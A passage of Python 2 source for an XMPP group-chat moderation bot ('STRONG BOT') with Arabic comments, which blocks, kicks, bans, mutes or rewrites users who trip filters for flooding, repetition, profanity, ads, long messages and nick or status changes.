                if "off" not in FILTER_Status_MSG: #فلتر الحالات السيئة مسبات و اعلانات
                        if not chat in MUC_statusr:
                         MUC_statusr[chat]={}  			
                        if Status_Sp2(status):
                                try:
                                        if not 'statusr' in MUC_statusr[chat].keys() and "حجب".decode('utf8') in FILTER_Status_MSG:
                                         filter_pres_start(m, XFiltMSG[32],type,query,iq,chat,jid,xs,cljid)                     
                                         return                                                                  
                                        if not 'statusr' in MUC_statusr[chat].keys() and "فصل".decode('utf8') in FILTER_Status_MSG:
                                         ban1(cljid, chat, XFiltMSG[31]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[32]+XFiltMSG[4],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if not 'statusr' in MUC_statusr[chat].keys() and "تغيير".decode('utf8') in FILTER_Status_MSG:                                                
                                         filter_xs_002_start(m, status.replace(status,"BAD STATUS"+" | "+"STRONG BOT"),type,query,iq,chat,jid,xs,cljid) 
                                         return 														
                                        if MUC_statusr[chat]['statusr']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[31]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[32]+XFiltMSG[4],type,query,iq,chat,jid,xs,cljid)                     
                                         return 												
                                        if MUC_statusr[chat]['statusr']=='تعطيل'.decode('utf8'):pass					
                                        if MUC_statusr[chat]['statusr']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[32],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if MUC_statusr[chat]['statusr']=='تغيير'.decode('utf8'):                                             
                                         filter_xs_002_start(m, status.replace(status,"\n"+"BAD STATUS"+" | "+"STRONG BOT"+"\n"),type,query,iq,chat,jid,xs,cljid) 
                                         return 	   
                                except:    ban1(cljid, chat, XFiltMSG[31]%("."), jid)                                                                          
		
			
		
        if type in ['chat','normal','groupchat']:
                for x in m.elements():
                        if x.name == "body": body = x.__str__()
                if not MUC_FILT.has_key(chat): MUC_FILT[chat] = {}
                if not MUC_FILT[chat].has_key('traf'): MUC_FILT[chat]['traf'] = traf
                else: MUC_FILT[chat]['traf'] += traf
                jid = m['from']
                s = [chat+'/'+jid, chat, jid, cljid]
                if hasattr(jid, 'count'):
                        if jid.count('/'): jid = jid.split('/')[0]
                if not chat in MUC_FILT3:
                        MUC_FILT3[chat] = {}
                if not jid in MUC_FILT3[chat]:
                        MUC_FILT3[chat][jid] = {"timz":0,"new":0,"top":0,"top1":0}                     
                if traf > Traffic2:
                        kick2(s, XFiltMSG[65])                        
                if not jid in MUC_FILT[chat]:
                        MUC_FILT[chat][jid]={'new':0, 't':time.time(), 'm':body,'rebzmsg':0,'timz':0}
                else:		
                 if "off" not in FILTER_MSG_SPEED:    #فلتر السرعة
                                if chat not in MUC_speed:
                                 MUC_speed[chat]={}							
                                if time.time() - MUC_FILT[chat][jid]['t'] < TimeMsG:
                                        if not 'speed' in MUC_speed[chat].keys() and "حجب".decode('utf8') in FILTER_MSG_SPEED:
                                                Muc_Filter_start(m,XFiltMSG[43]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return                                                                                                 
                                        if not 'speed' in MUC_speed[chat].keys() and "طرد".decode('utf8') in FILTER_MSG_SPEED:
                                                kick2(s, XFiltMSG[43]%(XFiltMSG[39]))
                                                return
                                        if not 'speed' in MUC_speed[chat].keys() and "فصل".decode('utf8') in FILTER_MSG_SPEED:
                                                ban1(cljid, chat, XFiltMSG[43]%(XFiltMSG[39]), jid)
                                                return
                                        if not 'speed' in MUC_speed[chat].keys() and"صامت".decode('utf8') in FILTER_MSG_SPEED:
                                                visitor2(s, "")
                                                return	                                         
                                        if MUC_speed[chat]['speed']=='فصل'.decode('utf8'):
                                                ban1(cljid, chat, XFiltMSG[43]%(XFiltMSG[39]), jid)
                                                return		
                                        if MUC_speed[chat]['speed']=='طرد'.decode('utf8'):
                                                kick2(s, XFiltMSG[43]%(XFiltMSG[39]))
                                                return	
                                        if MUC_speed[chat]['speed']=='تعطيل'.decode('utf8'):
                                                pass								
                                        if MUC_speed[chat]['speed']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[43]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return    
                                        if MUC_speed[chat]['speed']=='صامت'.decode('utf8'):
                                                visitor2(s, "")
                                                return		
												
                if "off" not in FILTER_MSG_REP:   #فلتر تكرار الرسائل
                                if chat not in MUC_rep:
                                 MUC_rep[chat]={} 						
                                if  MUC_FILT[chat][jid]['m']==body and MUC_FILT[chat][jid]['rebzmsg']>1:
                                        if not 'rep' in MUC_rep[chat].keys() and "حجب".decode('utf8') in FILTER_MSG_REP: 
                                                Muc_Filter_start(m,XFiltMSG[42]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return  
                                        if not 'rep' in MUC_rep[chat].keys() and "طرد".decode('utf8') in FILTER_MSG_REP:
                                                kick2(s, XFiltMSG[42]%(XFiltMSG[38]))
                                                return
                                        if not 'rep' in MUC_rep[chat].keys() and"صامت".decode('utf8') in FILTER_MSG_REP:
                                                visitor2(s, "")
                                                return	                                    
                                        if not 'rep' in MUC_rep[chat].keys() and "فصل".decode('utf8').decode('utf8') in FILTER_MSG_REP:
                                                ban1(cljid, chat, XFiltMSG[42]%(XFiltMSG[38]), jid)
                                                return	                                        
                                        if MUC_rep[chat]['rep']=='فصل'.decode('utf8'):
                                                ban1(cljid, chat, XFiltMSG[42]%(XFiltMSG[38]), jid)
                                                return		
                                        if MUC_rep[chat]['rep']=='طرد'.decode('utf8'):
                                                kick2(s, XFiltMSG[42]%(XFiltMSG[38]))
                                                return	
                                        if MUC_rep[chat]['rep']=='تعطيل'.decode('utf8'):
                                                pass								
                                        if MUC_rep[chat]['rep']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[42]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return                                     
                                        if MUC_rep[chat]['rep']=='صامت'.decode('utf8'):
                                                visitor2(s, "")
                                                return	   

                if "off" not in FILTER_CENSOR:    
                        if chat not in MUC_MSG:
                            MUC_MSG[chat]={}					#فلتر الرسائل السيئة مسبات و اعلانات
                        if SmartCensor5(body):#CENSOR
                                if not 'cans' in MUC_MSG[chat].keys() and "طرد".decode('utf8') in FILTER_CENSOR:
                                        kick2(s, XFiltMSG[46]%(XFiltMSG[39]))
                                        return
                                if not 'cans' in MUC_MSG[chat].keys() and "فصل".decode('utf8') in FILTER_CENSOR:
                                        ban1(cljid, chat, XFiltMSG[46]%(XFiltMSG[39]), jid)
                                        return
                                if not 'cans' in MUC_MSG[chat].keys() and "حجب".decode('utf8') in FILTER_CENSOR:
                                                Muc_Filter_start(m,XFiltMSG[46]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if not 'cans' in MUC_MSG[chat].keys() and "تغيير".decode('utf8') in FILTER_CENSOR:
                                 chat2(m, body.replace(body,"STRONG BOT FILTER"),type,query,iq,chat,jid,xs,s)
                                 return 
                                if not 'cans' in MUC_MSG[chat].keys() and"صامت".decode('utf8') in FILTER_CENSOR:
                                        visitor2(s, "")
                                        return                                  
                                if MUC_MSG[chat]['cans']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[46]%(XFiltMSG[39]), jid)
                                        return	
                                if MUC_MSG[chat]['cans']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[46]%(XFiltMSG[39]))
                                        return						
                                if MUC_MSG[chat]['cans']=='تعطيل'.decode('utf8'):
                                        pass	
                                if MUC_MSG[chat]['cans']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[46]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if MUC_MSG[chat]['cans']=='تغيير'.decode('utf8'):
                                 chat2(m, body.replace(body,"STRONG BOT FILTER"),type,query,iq,chat,jid,xs,s)
                                 return 
                                if MUC_MSG[chat]['cans']=='صامت'.decode('utf8'):
                                        visitor2(s, "")
                                        return  
                if "off" not in FILTER_MSG_NONE:    #فلتر الرسائل الفارغة
                                if chat not in NONE_MSGXX:
                                 NONE_MSGXX[chat]={}					
                                if body.isspace():
                                        if not 'none' in NONE_MSGXX[chat].keys() and "حجب".decode('utf8') in FILTER_MSG_NONE:
                                                Muc_Filter_start(m,XFiltMSG[45],type,query,iq,chat,jid,xs,s)
                                                return   
                                        if not 'none' in NONE_MSGXX[chat].keys() and "طرد".decode('utf8') in FILTER_MSG_NONE:
                                                kick2(s, XFiltMSG[44]%(XFiltMSG[39]))
                                                return
                                        if not 'none' in NONE_MSGXX[chat].keys()and "فصل".decode('utf8') in FILTER_MSG_NONE:
                                                ban1(cljid, chat, XFiltMSG[44]%(XFiltMSG[39]), jid)
                                                return
                                        if not 'none' in NONE_MSGXX[chat].keys() and"صامت".decode('utf8') in FILTER_MSG_NONE:
                                                visitor2(s, "")
                                                return
                                        if not 'none' in NONE_MSGXX[chat].keys() and "تغيير".decode('utf8') in FILTER_MSG_NONE:                                              
                                                chat2(m, body.replace(body,XFiltMSG[45]),type,query,iq,chat,jid,xs,s)
                                                return 	                                        
                                        if NONE_MSGXX[chat]['none']=='فصل'.decode('utf8'):
                                                ban1(cljid, chat, XFiltMSG[44]%(XFiltMSG[39]), jid)
                                                return		
                                        if NONE_MSGXX[chat]['none']=='طرد'.decode('utf8'):
                                                kick2(s, XFiltMSG[44]%(XFiltMSG[39]))
                                                return	
                                        if NONE_MSGXX[chat]['none']=='تعطيل'.decode('utf8'):
                                                pass								
                                        if NONE_MSGXX[chat]['none']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[45],type,query,iq,chat,jid,xs,s)
                                                return   
                                        if NONE_MSGXX[chat]['none']=='صامت'.decode('utf8'):
                                                visitor2(s, "")
                                                return
                                        if NONE_MSGXX[chat]['none']=='تغيير'.decode('utf8'):                                              
                                                chat2(m, body.replace(body,XFiltMSG[45]),type,query,iq,chat,jid,xs,s)
                                                return 		
                if "off" not in FILTER_SPACE:     
                        if chat not in SPACE_MSGX:     #فلتر الاسطر
                            SPACE_MSGX[chat]={}	
                        try: 
                         SPACEZ= int("".join(str(MUC_LIN_FILTER["MaxSpace"][chat])))						 
                        except: SPACEZ=SPACE 							
                        if body.count("\n") >= SPACEZ:
                                if not 'space' in SPACE_MSGX[chat].keys() and "حجب".decode('utf8') in FILTER_SPACE:
                                                Muc_Filter_start(m,XFiltMSG[48]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if not 'space' in SPACE_MSGX[chat].keys() and "تغيير".decode('utf8') in FILTER_SPACE:
                                        chat2(m, body.replace(body,XFiltMSG[49]),type,query,iq,chat,jid,xs,s)
                                        return 	                                 
                                if not 'space' in SPACE_MSGX[chat].keys() and "طرد".decode('utf8') in FILTER_SPACE:
                                        kick2(s, XFiltMSG[48]%(XFiltMSG[39]))
                                        return	
                                if not 'space' in SPACE_MSGX[chat].keys() and "فصل".decode('utf8') in FILTER_SPACE:
                                        ban1(cljid, chat, XFiltMSG[48]%(XFiltMSG[39]), jid)
                                        return
                                if not 'space' in SPACE_MSGX[chat].keys() and"صامت".decode('utf8') in FILTER_SPACE:
                                        visitor2(s, "")
                                        return                                 
                                if SPACE_MSGX[chat]['space']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[48]%(XFiltMSG[39]), jid)
                                        return		
                                if SPACE_MSGX[chat]['space']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[48]%(XFiltMSG[39]))
                                        return	
                                if SPACE_MSGX[chat]['space']=='تعطيل'.decode('utf8'):
                                        pass								
                                if SPACE_MSGX[chat]['space']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[48]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if SPACE_MSGX[chat]['space']=='صامت'.decode('utf8'):
                                        visitor2(s, "")
                                        return
                                if SPACE_MSGX[chat]['space']=='تغيير'.decode('utf8'):                                      
                                        chat2(m, body.replace(body,XFiltMSG[49]),type,query,iq,chat,jid,xs,s)
                                        return      
                if "off" not in FILTER_MaXMsG:    #فلتر الرسالة الطويلة
                        if chat not in MUC_FCON:
                            MUC_FCON[chat]={}
                        try: 
                         MaxMsgZ= int("".join(str(MUC_LIN_FILTER["MaxMsg"][chat])))						 
                        except: MaxMsgZ=MaXMsg	  
                        try: 
                         FloodZ= int("".join(str(MUC_LIN_FILTER["MaxFlood"][chat])))						 
                        except: FloodZ=Flood  							
                        if len(body) >= MaxMsgZ and not len(body) >= FloodZ:
                                if not 'len' in MUC_FCON[chat].keys() and "طرد".decode('utf8') in FILTER_MaXMsG:
                                        kick2(s, XFiltMSG[50]%(XFiltMSG[39]))
                                        return
                                if not 'len' in MUC_FCON[chat].keys() and "فصل".decode('utf8') in FILTER_MaXMsG:
                                        ban1(cljid, chat, XFiltMSG[50]%(XFiltMSG[39]), jid)
                                        return	
                                if not 'len' in MUC_FCON[chat].keys() and "حجب".decode('utf8') in FILTER_MaXMsG:
                                                Muc_Filter_start(m,XFiltMSG[50]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if not 'len' in MUC_FCON[chat].keys() and "تغيير".decode('utf8') in FILTER_MaXMsG:                                        
                                        chat2(m, body[0:MaxMsgZ]+XFiltMSG[51],type,query,iq,chat,jid,xs,s)
                                        return 
                                if not 'len' in MUC_FCON[chat].keys() and"صامت".decode('utf8') in FILTER_MaXMsG:
                                        visitor2(s, "")
                                        return	                                
                                if MUC_FCON[chat]['len']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[50]%(XFiltMSG[39]), jid)
                                        return	
                                if MUC_FCON[chat]['len']=='تعطيل'.decode('utf8'):
                                        pass								
                                if MUC_FCON[chat]['len']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[50]%(XFiltMSG[39]))
                                        return								
                                if MUC_FCON[chat]['len']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[50]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if MUC_FCON[chat]['len']=='تغيير'.decode('utf8'):                                      
                                        chat2(m, body[0:MaxMsgZ]+XFiltMSG[51],type,query,iq,chat,jid,xs,s)
                                        return 
                                if MUC_FCON[chat]['len']=='صامت'.decode('utf8'):
                                        visitor2(s, "")
                                        return   
                if "off" not in FILTER_FLOOD:     
                        if chat not in MUC_FCON8:
                            MUC_FCON8[chat]={}		
                        try: 
                         MaxMsgZ= int("".join(str(MUC_LIN_FILTER["MaxMsg"][chat])))						 
                        except: MaxMsgZ=MaXMsg	  
                        try: 
                         FloodZ= int("".join(str(MUC_LIN_FILTER["MaxFlood"][chat])))						 
                        except: FloodZ=Flood  									
                        if len(body) >= FloodZ:
                                if not 'len' in MUC_FCON8[chat].keys() and "فصل".decode('utf8') in FILTER_FLOOD:
                                        ban1(cljid, chat, XFiltMSG[52]%(XFiltMSG[39]), jid)
                                        return
                                if not 'len' in MUC_FCON8[chat].keys() and "طرد".decode('utf8') in FILTER_FLOOD:
                                        kick2(s, XFiltMSG[52]%(XFiltMSG[39]))
                                        return	
                                if not 'len' in MUC_FCON8[chat].keys() and "حجب".decode('utf8') in FILTER_FLOOD:

                                                Muc_Filter_start(m,XFiltMSG[52]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if not 'len' in MUC_FCON8[chat].keys() and "تغيير".decode('utf8') in FILTER_FLOOD:                                    
                                        chat2(m, body[0:FloodZ]+XFiltMSG[53],type,query,iq,chat,jid,xs,s)
                                        return
                                if not 'len' in MUC_FCON8[chat].keys() and"صامت".decode('utf8') in FILTER_FLOOD:
                                        visitor2(s, "")
                                        return                                  
                                if MUC_FCON8[chat]['len']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[52]%(XFiltMSG[39]), jid)
                                        return	
                                if MUC_FCON8[chat]['len']=='تعطيل'.decode('utf8'):
                                        pass								
                                if MUC_FCON8[chat]['len']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[52]%(XFiltMSG[39]))
                                        return								
                                if MUC_FCON8[chat]['len']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[52]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if MUC_FCON8[chat]['len']=='تغيير'.decode('utf8'):                             
                                        chat2(m, body[0:FloodZ]+XFiltMSG[53],type,query,iq,chat,jid,xs,s)
                                        return
                                if MUC_FCON8[chat]['len']=='صامت'.decode('utf8'):
                                        visitor2(s, "")
                                        return    
                if "off" not in FILTER_ADB:      #فلتر الرسائل السيئة مسبات و اعلانات
                        if chat not in MUC_adb:
                            MUC_adb[chat]={}					
                        if order_56ords(body):
                                if not 'adblock' in MUC_adb[chat].keys() and "فصل".decode('utf8') in FILTER_ADB:
                                        ban1(cljid, chat, XFiltMSG[54]%(XFiltMSG[39]), jid)
                                        return
                                if not 'adblock' in MUC_adb[chat].keys() and "طرد".decode('utf8') in FILTER_ADB:
                                        kick2(s, XFiltMSG[54]%(XFiltMSG[39]))
                                        return	
                                if not 'adblock' in MUC_adb[chat].keys() and "حجب".decode('utf8') in FILTER_ADB:
                                                Muc_Filter_start(m,XFiltMSG[54]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if not 'adblock' in MUC_adb[chat].keys() and "تغيير".decode('utf8') in FILTER_ADB:
                                        chat2(m, body.replace(''.join([c for c in ADB if c in body]),XFiltMSG[55]),type,query,iq,chat,jid,xs,s)
                                        return
                                if not 'adblock' in MUC_adb[chat].keys() and"صامت".decode('utf8') in FILTER_ADB:
                                        visitor2(s, "")
                                        return	                                
                                if MUC_adb[chat]['adblock']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[54]%(XFiltMSG[39]), jid)
                                        return	
                                if MUC_adb[chat]['adblock']=='تعطيل'.decode('utf8'):
                                        pass						
                                if MUC_adb[chat]['adblock']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[54]%(XFiltMSG[39]))
                                        return		
                                if MUC_adb[chat]['adblock']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[54]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if MUC_adb[chat]['adblock']=='تغيير'.decode('utf8'):
                                        chat2(m, body.replace(''.join([c for c in ADB if c in body]),XFiltMSG[55]),type,query,iq,chat,jid,xs,s)
                                        return
                                if MUC_adb[chat]['adblock']=='صامت'.decode('utf8'):
                                        visitor2(s, "")
                                        return	  
                if "off" not in FILTER_ANswer:  #فلتر السياسة
                        if chat not in MUC_answer:
                            MUC_answer[chat]={}				
                        if order_words(body):
                                if not 'answer' in MUC_answer[chat].keys() and "طرد".decode('utf8') in FILTER_ANswer:
                                        kick2(s, XFiltMSG[56]%(XFiltMSG[39]))
                                        return
                                if not 'answer' in MUC_answer[chat].keys() and "فصل".decode('utf8') in FILTER_ANswer:
                                        ban1(cljid, chat, XFiltMSG[56]%(XFiltMSG[39]), jid)
                                        return	
                                if not 'answer' in MUC_answer[chat].keys() and "حجب".decode('utf8') in FILTER_ANswer:
                                                Muc_Filter_start(m,XFiltMSG[56]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if not 'answer' in MUC_answer[chat].keys() and "تغيير".decode('utf8') in FILTER_ANswer:
                                        chat2(m, body.replace(''.join([c for c in MSG_BAD2 if c in body]),XFiltMSG[57]),type,query,iq,chat,jid,xs,s)
                                        return
                                if not 'answer' in MUC_answer[chat].keys() and"صامت".decode('utf8') in FILTER_ANswer:
                                        visitor2(s,"")
                                        return	                                
                                if MUC_answer[chat]['answer']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[56]%(XFiltMSG[39]), jid)
                                        return	
                                if MUC_answer[chat]['answer']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[56]%(XFiltMSG[39]))
                                        return		
                                if MUC_answer[chat]['answer']=='حجب'.decode('utf8'):
                                                Muc_Filter_start(m,XFiltMSG[56]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                                return   
                                if MUC_answer[chat]['answer']=='تغيير'.decode('utf8'):
                                        chat2(m, body.replace(''.join([c for c in MSG_BAD2 if c in body]),XFiltMSG[57]),type,query,iq,chat,jid,xs,s)
                                        return
                                if MUC_answer[chat]['answer']=='صامت'.decode('utf8'):
                                        visitor2(s,"")
                                        return	       
                if nawrs(body):
                        for i in Smail:
                         if i in body:
                          body=body.replace(i,"") 	
                        for y in rmoz:
                         if y in body:
                          body=body.replace(y,"") 				
                        body=body.lower()
                        for x in Gsmart:
                                if body.count(x):      
                                                Muc_Filter_start(m,"".join(Gsmart[x]["حجب".decode('utf8')].keys()),type,query,iq,chat,jid,xs,s)
                                                return                                              
                if nawrsx(body,chat):
                        for i in Smail:
                         if i in body:
                          body=body.replace(i,"") 	
                        for y in rmoz:
                         if y in body:
                          body=body.replace(y,"") 					
                        body=body.lower()                         
                        for x in smart[chat].keys():
                                if x in body:  
                                                Muc_Filter_start(m,"".join(smart[chat][x]["حجب".decode('utf8')].keys()),type,query,iq,chat,jid,xs,s)
                                                return    
                if checkall(body, chat):
                        for i in Smail:
                         if i in body:
                          body=body.replace(i,"") 	
                        for y in rmoz:
                         if y in body:
                          body=body.replace(y,"") 				
                        body=body.lower()                    
                        for x in BADall[chat].keys():
                                if body.count(x):                        
                                        kick2(s, "".join(BADall[chat][x]["حجب".decode('utf8')].keys()))
                                        return
                if Gcheckall(body):
                        for i in Smail:
                         if i in body:
                          body=body.replace(i,"") 	
                        for y in rmoz:
                         if y in body:
                          body=body.replace(y,"") 				
                        body=body.lower()
                        for x in GBADall:
                                if body.count(x):                        
                                        kick2(s, "".join(GBADall[x]["حجب".decode('utf8')].keys()))
                                        return    												
                MUC_FILT[chat][jid]['rebzmsg'] += 1                
                MUC_FILT[chat][jid]['m']=body
                MUC_FILT[chat][jid]['t']=time.time()	
        if type in ['chat']:   
                if not chat in MUC_FILT3:
                        MUC_FILT3[chat] = {}
                if not jid in MUC_FILT3[chat]:
                        MUC_FILT3[chat][jid] = {"top1":0} 		
                for x in m.elements():
                        if x.name == "body": body = x.__str__()		
                s = [chat+'/'+jid, chat, jid, cljid]						
                if m['to'] in MUC_FILT4['msg']:
                 body=body.lower()
                 body=body.replace('ـ','').replace(',','').replace(':','').replace('9','').replace('8','').replace('7','').replace('6','').replace('5','').replace('4','').replace('3','').replace('2','').replace('1','').replace(' ','').replace('.','').replace('ط›','').replace('~','').replace('"','').replace(']','').replace('[','').replace(')','').replace('(','').replace('>','').replace('<','').replace('طں','').replace('?','').replace('=','').replace('+','').replace('_','').replace('-','').replace('*','').replace('&','').replace('^','').replace('%','').replace('$','').replace('#','').replace('@','').replace('!','').replace('؟','').replace('?','').replace('0','').replace('،','')                           					
                 if body in MUC_FILT4['msg'][m['to']].keys():	
                  Muc_Filter_start(m,"كلمة ممنوعة في الخاص",type,query,iq,chat,jid,xs,s)
                  return	


        if type in ['groupchat']: 
                if "off" not in NEWMSG_REP:		#فلتر تكرار الرسائل 
                        if chat not in MUC_MSG9:
                            MUC_MSG9[chat]={}				
                        if SameChar(body):#tkrara rsala تكرار
                                if not 'cans' in MUC_MSG9[chat].keys() and "حجب".decode('utf8') in NEWMSG_REP:
                                   Muc_Filter_start(m,XFiltMSG[59]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                   return	
                                if not 'cans' in MUC_MSG9[chat].keys() and "طرد".decode('utf8') in NEWMSG_REP:
                                        kick2(s, XFiltMSG[59]%(XFiltMSG[39]))
                                        return	
                                if not 'cans' in MUC_MSG9[chat].keys() and "فصل".decode('utf8') in NEWMSG_REP:
                                        ban1(cljid, chat, XFiltMSG[59]%(XFiltMSG[39]), jid)
                                        return
                                if not 'cans' in MUC_MSG9[chat].keys() and "تغيير".decode('utf8') in NEWMSG_REP:
                                        i = chat2(m, body.replace(body,XFiltMSG[60]),type,query,iq,chat,jid,xs,s)
                                        query.addRawXml(i.toXml())
                                        reactor.callFromThread(iq.send, xs['from'],)
                                        return
                                if not 'cans' in MUC_MSG9[chat].keys() and"صامت".decode('utf8') in NEWMSG_REP:
                                        visitor2(s,"")
                                        return	                                
                                if MUC_MSG9[chat]['cans']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[59]%(XFiltMSG[39]), jid)
                                        return	
                                if MUC_MSG9[chat]['cans']=='طرد'.decode('utf8'):
                                        kick2(s, XFiltMSG[59]%(XFiltMSG[39]))
                                        return						
                                if MUC_MSG9[chat]['cans']=='تعطيل'.decode('utf8'):
                                        pass	
                                if MUC_MSG9[chat]['cans']=='حجب'.decode('utf8'):
                                   Muc_Filter_start(m,XFiltMSG[59]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                   return	
                                if MUC_MSG9[chat]['cans']=='تغيير'.decode('utf8'):
                                        i = chat2(m, body.replace(body,XFiltMSG[60]),type,query,iq,chat,jid,xs,s)
                                        query.addRawXml(i.toXml())
                                        reactor.callFromThread(iq.send, xs['from'],)
                                        return
                                if MUC_MSG9[chat]['cans']=='صامت'.decode('utf8'):
                                        visitor2(s,"")
                                        return	                                
                if "off" not in FILTER_SPAM2:     #فلتر السبام
                        if chat not in MUC_SPAM2:
                            MUC_SPAM2[chat]={}					
                        if body.count(" "):
                                if time.time() - MUC_FILT[chat][jid]['t'] < TimeMsG1 and hackbot11(MUC_FILT[chat][jid]['m'], body):
                                        if not 'spam2' in MUC_SPAM2[chat].keys() and "حجب".decode('utf8') in FILTER_SPAM2:
                                         Muc_Filter_start(m,XFiltMSG[61]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                         return	
                                        if not 'spam2' in MUC_SPAM2[chat].keys() and "تغيير".decode('utf8') in FILTER_SPAM2:
                                                i = chat2(m, body.replace(body,XFiltMSG[62]),type,query,iq,chat,jid,xs,s)
                                                query.addRawXml(i.toXml())
                                                reactor.callFromThread(iq.send, xs['from'],)
                                                return                                        
                                        if not 'spam2' in MUC_SPAM2[chat].keys() and "طرد".decode('utf8') in FILTER_SPAM2:
                                                kick2(s, XFiltMSG[61]%(XFiltMSG[39]))
                                                return	
                                        if not 'spam2' in MUC_SPAM2[chat].keys() and "فصل".decode('utf8') in FILTER_SPAM2:
                                                ban1(cljid, chat, XFiltMSG[61]%(XFiltMSG[39]), jid)
                                                return
                                        if not 'spam2' in MUC_SPAM2[chat].keys() and"صامت".decode('utf8') in FILTER_SPAM2:
                                                visitor2(s,"")
                                                return	                                        
                                        if MUC_SPAM2[chat]['spam2']=='فصل'.decode('utf8'):
                                                ban1(cljid, chat, XFiltMSG[61]%(XFiltMSG[39]), jid)
                                                return	
                                        if MUC_SPAM2[chat]['spam2']=='طرد'.decode('utf8'):
                                                kick2(s, XFiltMSG[61]%(XFiltMSG[39]))
                                                return													
                                        if MUC_SPAM2[chat]['spam2']=='تعطيل'.decode('utf8'):
                                                pass	
                                        if MUC_SPAM2[chat]['spam2']=='حجب'.decode('utf8'):
                                         Muc_Filter_start(m,XFiltMSG[61]%(XFiltMSG[41]),type,query,iq,chat,jid,xs,s)
                                         return	
                                        if MUC_SPAM2[chat]['spam2']=='صامت'.decode('utf8'):
                                                visitor2(s,"")
                                                return
                                        if MUC_SPAM2[chat]['spam2']=='تغيير'.decode('utf8'):
                                                i = chat2(m, body.replace(body,XFiltMSG[62]),type,query,iq,chat,jid,xs,s)
                                                query.addRawXml(i.toXml())
                                                reactor.callFromThread(iq.send, xs['from'],)
                                                return                                           								
								
                try: 
                        if jid in CHMSG[chat].keys():
                         Muc_Filter_startx(m,"".join(CHMSG1[chat].keys()).split(jid+" ")[1].split("#")[0],type,query,iq,chat,jid,xs,s)
                         return	                                          
                except: pass
                if "no" not in FILTER_GOOD_LANG:   #فلتر الكتابة باللغات المعروفة
                        if not chat in MUC_AR_EN:
                         MUC_AR_EN[chat]=['تعطيل'.decode('utf8')]					
                        if MUC_ARABIC(body,chat):                        
                                if 'تفعيل'.decode('utf8') in MUC_AR_EN[chat]:
                                         Muc_Filter_start(m,X_Filter_Ar_En[4],type,query,iq,chat,jid,xs,s)
                                         return	
                                if 'تعطيل'.decode('utf8') in MUC_AR_EN[chat]:
                                        pass                                
                                if 'تفعيل'.decode('utf8') in MUC_AR_EN[chat]:                                
                                         Muc_Filter_start(m,X_Filter_Ar_En[4],type,query,iq,chat,jid,xs,s)
                                         return		


								   
        elif type in [None]:

                s = [chat+'/'+m['from'], chat, m['from'], cljid]		
                jid = get_true_jid(m['from'])
                if not chat in FILTER_chang: FILTER_chang[chat]={}
                if not jid in FILTER_chang[chat].keys():
                 FILTER_chang[chat][jid]={"nick":nick,"status":status,"time":time.time(),"len":0,"len1":0}
                ni_aa =  test_chang_nick(nick,chat,jid)	
                st_aa =  test_chang_status(status,chat,jid) 				
                if "off" not in Filter_chang_nick: 	
                 if ni_aa(nick,chat,jid):
                  kick1(s, "ممنوع تغيير الاسماء داخل الروم \n STRONG BOT [2022]")
                  return				  
                if "off" not in Filter_chang_status: 	
                 if st_aa(status,chat,jid):			 
                  kick1(s, "ممنوع تغيير الاسماء داخل الروم \n STRONG BOT [2022]")
                  return	
                if "off" not in Filter_speed_chang_nick: 				  
                 if speed_chang_nick(ni_aa,nick,chat,jid):		
                  kick1(s, "ممنوع تغيير الاسماء بصورة سريعة داخل الروم \n STRONG BOT [2022]")
                  return	
                if "off" not in Filter_speed_chang_status: 				  
                 if speed_chang_status(st_aa,status,chat,jid):								  
